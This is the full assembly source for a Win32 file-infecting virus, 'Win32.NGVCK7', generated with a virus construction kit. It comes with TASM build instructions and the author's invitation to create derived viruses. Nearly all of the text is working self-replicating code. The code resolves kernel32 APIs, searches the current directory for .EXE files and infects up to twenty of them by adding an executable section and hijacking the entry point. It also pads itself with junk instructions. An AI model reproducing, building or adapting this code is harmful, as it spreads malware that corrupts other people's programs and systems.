              
;
;
; Win32.NGVCK7 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK7
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 48
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
                                        ; add esp, 4
 add esp, 4d
 mov edx, dword ptr [esp-4]
                                        ; mov ebp, edx
 push edx
 pop ebp
 jmp KernelSearchStart


;                  [ ///// * Data * \\\\\ ]

Data:
 sectionalign   dd 0h

 APINames:
 db 18d, 'GetFileAttributesA'
 db 11d, 'CreateFileA'
 db 18d, 'SetFileAttributesA'
 db 13d, 'MapViewOfFile'
 db 18d, 'CreateFileMappingA'
 db 09d, 'FindClose'
 db 14d, 'FindFirstFileA'
 db 15d, 'UnmapViewOfFile'
 db 13d, 'FindNextFileA'
 db 11d, 'CloseHandle'

 TempApisearch3 dd 0h
 MapHandle   dd 0h
 KernelMZ    dd 0h
 NewSize     dd 0h
 FindHandle  dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.uwojvtv'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 TempAPI     dd 0h
 filealign   dd 0h
 OTableVA    dd 0h
 AlignReg1   dd 0h
 NewEIP      dd 0h
 FileHandle  dd 0h
 PEheader    dd 0h
 ATableVA    dd 0h
 filemask    db '*.EXe',0
 TempApisearch1 dd 0h
 counter     dw 0h
 KernelPE    dd 0h
 NTableVA    dd 0h
 NTableTemp  dd 0h

 InfCounter  dd 0h
 OldEIP      dd 0h
 AlignReg2   dd 0h
 OldBase     dd 400000h
 Misc1       dd 0h

 APIOffsets:
 XGetFileAttributesA    dd 0h
 XCreateFileA           dd 0h
 XSetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindClose             dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XFindNextFileA         dd 0h
 XCloseHandle           dd 0h

 Attributes  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapAddress  dd 0h
 db 'Virus : Win32.NGVCK7 Author : SnakeByte',0




;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea eax, [ebp+WFD_szFileName]

 push eax
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 cmp eax, 0
 je NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 xor edx, 'ZM'
 jz Goodfile
                                        ; clear edx
 mov edx, -25065d
 add edx, 25065d
 or edx, edx
 jz Notagoodfile

Goodfile:
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ecx+3Ch]
 cmp edx, 0
 je Notagoodfile
 mov eax, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp eax, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add eax, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [eax], 'EP'
 je Goodfile2
                                        ; clear edx
 push 0
 pop edx
 test edx, edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [eax+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for OBJ
 mov dx, word ptr [eax+16h]
 and dx, 00002h
 cmp dx, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov bx, word ptr [eax+16h]
 and bx, 0F000h
 cmp bx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
 mov ebx, dword ptr [ebp+Attributes]
 push ebx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ebx

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov edx, [edi+3Ch]
 add edx, edi
                                        ; get File Alignment
 mov eax, [edx+3Ch]
 push eax
 pop dword ptr [ebp+filealign]
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], ecx
                                        ; get old Entrypoint
 mov ebx, dword ptr [ecx+28h]
 sar eax, 30d                           ; Trash
 mov dword ptr [ebp+OldEIP], ebx
 mov eax, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], eax
 mov edx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], 0
 xor dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov ebx, [ecx+74h]
 shl ebx, 3
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [ecx+6h]
 mov eax, 28h
 pushad
 mov eax, edx
 mul eax
 mov dword ptr [ebp+Misc1], eax
 popad
 mov edx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, ebx
 add ecx, edx
 mov eax, offset newsection
 add eax, ebp


 xchg eax, ecx
 push eax
                                        ; Calculate the RVA of the new section
 mov edx, [eax-5*8+8d]
 add edx, [eax-5*8+12d]
 mov ecx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 mov dword ptr [ebp+nsphysicalsize], -1
 and dword ptr [ebp+nsphysicalsize], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], edx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], -1
 and dword ptr [ebp+nsvirtualsize], edx
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], ebx
 push ecx
 pop dword ptr [ebp+AlignReg2]
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], 0
 xor dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov ecx, dword ptr [ebp+filealign]
 mov eax, edx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], ecx
 call Align
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], -1
 and dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 lea esi, [ebp+newsection]
 xchg esi, ecx

                                        ; mov edx, 64
 mov edx, ( 64d xor 3d )
 xor edx, 3d
 pop ebx
WriteNewSectionLoop:
 mov ah, byte ptr [ecx]
 mov byte ptr [ebx], ah
                                        ; add ebx, 1
 inc ebx
 add edx, -1
                                        ; add ecx, 1
 sub ecx, -1d
 cmp edx, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
 mov ebx, dword ptr [ebp+PEheader]
 inc word ptr [ebx+06h]
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ebx+28h], edx
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 add dword ptr [ebx+4Ch], 'NGVC'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov edx, VirusSize
 lea esi, [ebp+Virus]


AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop eax
 add eax, -1
 mov dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 pop ecx
 stc
ret



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, 276d
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ecx


ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 add ecx, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]

 push edx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea edx, [ebp+WIN32_FIND_DATA]

 push edx
 push dword ptr [ebp+FindHandle]
 pop eax
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ebx Lenght of API-Name
                                        ; ecx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 xor edx, edx
 add edx, [eax+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
                                        ; add edx, 4
 add edx, 4d
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; add edx, 4
 add edx, 4d
                                        ; get OTableVA
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
 mov eax, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], eax
 mov edx, dword ptr [eax]
 add edx, [ebp+KernelMZ]
                                        ; mov eax, edx
 push edx
 pop eax
                                        ; mov esi, edx
 push edx
 pop esi
 mov dword ptr [ebp+TempApisearch1], ebx
 push esi
 mov dword ptr [ebp+TempApisearch3], 0
 xor dword ptr [ebp+TempApisearch3], ecx
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; ecx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov dh, byte ptr [ecx]
 cmp dh, byte ptr [esi]
 jne ApiNotFound
 dec ebx
 test ebx, ebx
 jz FoundApi1
                                        ; add esi, 1
 inc esi
                                        ; add ecx, 1
 inc ecx
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 mov ebx, dword ptr [ebp+TempApisearch1]
                                        ; clear eax
 mov eax, -44952d
 add eax, 44952d
 xor eax, dword ptr [ebp+NTableTemp]
 mov ecx, dword ptr [ebp+TempApisearch3]
                                        ; add eax, 4
 dec eax
 add eax, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 xchg eax, edx
 movzx eax, word ptr [edx]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea esi, [ebp+filemask]
 xchg ecx, esi
 not eax                                ; Trash

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 dec ebx
 inc ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; clear ecx
 sub ecx, ecx
 add ecx, dword ptr [ebp+FindHandle]
 push ecx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ecx, 80000000h or 40000000h
 push ecx
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push ebx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
                                        ; clear ebx
 sub ebx, ebx
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear edx
 push 0
 pop edx
 push edx
 push ebx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ebx
 dec eax
 add eax, 1
 jz CloseFile
                                        ; clear edx
 mov edx, 17142d
 sub edx, 17142d
 push ebx
 push edx
 push edx
                                        ; mov ecx, 2
 push 2d
 pop ecx
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 xor ebx, ebx
 add ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ebx

                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ecx


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov ecx, dword ptr [esp]
                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; add ecx, 1
 inc ecx
GetKernelLoop:
                                        ; clear ebx
 xor ebx, ebx
 dec ecx
 mov bx, word ptr [ecx+03ch]
 test bx,0f800h
 jnz GetKernelLoop
 cmp ecx, dword ptr [ecx+ebx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], ecx
                                        ; add ecx, 60
 add ecx, 60d
 mov eax, [ecx]
 sub ecx, 60d
 add eax, ecx
 mov [KernelPE+ebp], eax

 lea edx, GetApis
 add edx, ebp

 push edx
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldBase]
 pop edx

 mov dword ptr [ebp+retBase], edx

                                        ; clear ecx
 mov ecx, 44975d
 sub ecx, 44975d
 xor ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 xor edx, edx
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APIOffsets

 lea ebx, [ebp+APINames]
 xchg ebx, ecx


GetApisLoop: 

                                        ; clear ebx
 mov ebx, 55514d
 sub ebx, 55514d
 mov bl, byte ptr [ecx]
                                        ; add ecx, 1
 add ecx, 1d

                                        ; search 'em
                                        ; ebx contains Name-Lenght
                                        ; ecx points to the Name
                                        ; esi points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
 add ecx, ebx
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 inc esi
 add esi, 3d
 sub edx, 1
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 xchg edi, esi

 push esi
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, -56170d
 add edx, 56170d
 mov ebx, dword ptr [ebp+AlignReg2]
 div ebx
                                        ; add eax, 1
 inc eax
 mul ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 mov edx, -58149d
 add edx, 58149d
 push edx
 call ExitProcess



end FakeCode

